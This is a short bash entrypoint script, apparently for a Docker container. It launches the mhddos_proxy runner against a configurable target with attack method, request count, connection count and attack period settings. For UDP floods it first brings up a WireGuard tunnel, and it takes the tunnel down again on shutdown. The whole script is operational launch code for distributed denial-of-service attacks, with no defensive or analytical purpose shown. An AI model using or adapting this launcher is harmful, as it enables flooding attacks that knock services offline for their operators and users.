#!/bin/bash

# Exit on error
set -e

# Debug output
set -x

_term() {
  echo "Request to STOP received"
  wg-quick down wg0
  echo "STOPPED"
  kill -TERM "$child" 2>/dev/null
}

if [ "$1" = $APP_NAME ]; then
  shift;
  cd mhddos_proxy && python3 runner.py $TARGET --http-methods $METHOD -t $REQUESTS_COUNT --rpc $CONNECTIONS -p $ATTACK_PERIOD --debug &
  if [ "$METHOD" == "udp" ]; then
  wg-quick up wg0
  fi
  trap _term SIGTERM
  wg show
  sleep infinity &
  child=$!
  wait "$child"
fi

exec "$@"
